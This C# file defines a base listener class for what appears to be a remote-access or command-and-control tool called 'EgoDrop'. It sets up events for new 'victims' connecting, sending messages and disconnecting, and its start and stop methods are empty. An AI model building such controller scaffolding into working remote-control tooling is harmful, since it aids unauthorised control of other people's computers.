using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace EgoDrop
{
    public class clsListener
    {
        protected string m_szName { get; set; } //Listener's name.
        protected int m_nPort { get; set; }
        protected string m_szDescription { get; set; }
        protected clsSqlite.enListenerProtocol m_Protocol { get; set; }

        public clsSqlite.stListener m_stListener { get; set; }
        public bool m_bIsListening { get; set; }

        public delegate void dlgNewVictim(clsListener listener, clsVictim victim);
        public event dlgNewVictim evtNewVictim;
        public delegate void dlgReceivedMessage(clsListener listener, clsVictim victim, List<string> lsMsg);
        public event dlgReceivedMessage evtReceivedMessage;
        public delegate void dlgVictimDisconnected(clsListener listener, clsVictim victim);
        public event dlgVictimDisconnected evtVictimDisconnected;

        public clsListener()
        {
            
        }

        public virtual void fnStart()
        {
            
        }

        public virtual void fnStop()
        {

        }

        public void fnOnNewVictim(clsVictim victim)
        {
            evtNewVictim?.Invoke(this, victim);
        }

        public void fnOnReceivedMessage(clsVictim victim, List<string> lsMsg)
        {
            evtReceivedMessage?.Invoke(this, victim, lsMsg);
        }

        public void fnOnVictimDisconnected(clsVictim victim)
        {
            evtVictimDisconnected?.Invoke(this, victim);
        }
    }
}
